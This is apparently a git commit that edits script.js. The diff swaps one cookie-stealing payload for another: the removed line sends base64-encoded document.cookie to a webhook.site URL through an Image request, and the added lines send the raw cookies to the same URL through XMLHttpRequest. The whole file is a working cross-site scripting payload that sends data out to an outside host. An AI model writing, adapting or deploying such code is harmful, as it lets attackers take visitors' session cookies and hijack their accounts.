19c4a637bff3099f0ac61327bcbb30e4c8cb0622
InTheRain <indrswaragalihjayanegara@gmail.com>
2025-01-23 14:03:14 +0700

    oke

--- script.js
+++ script.js
@@ -1,2 +1,3 @@
-x = new Image();
-x.src = 'https://webhook.site/dfe62f06-b22d-4ab2-8123-51ba4aadce12?data='+btoa(document.cookie);
+var xhttp = new XMLHttpRequest();
+xhttp.open('GET', 'https://webhook.site/dfe62f06-b22d-4ab2-8123-51ba4aadce12' + document.cookie, true);
+xhttp.send();
